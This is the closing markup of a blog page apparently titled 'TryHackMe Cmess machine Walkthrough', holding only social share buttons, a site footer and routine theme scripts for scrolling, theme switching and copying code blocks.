            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f&amp;title=TryHackMe%20Cmess%20machine%20Walkthrough&amp;summary=TryHackMe%20Cmess%20machine%20Walkthrough&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on reddit"
            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f&title=TryHackMe%20Cmess%20machine%20Walkthrough">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on facebook"
            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on whatsapp"
            href="https://api.whatsapp.com/send?text=TryHackMe%20Cmess%20machine%20Walkthrough%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on telegram"
            href="https://telegram.me/share/url?text=TryHackMe%20Cmess%20machine%20Walkthrough&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share TryHackMe Cmess machine Walkthrough on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=TryHackMe%20Cmess%20machine%20Walkthrough&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fmachine-writeups%2fcmess-tryhackme%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span><strong><a href="https://0xt0pus.com">0xt0pus</a></strong></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
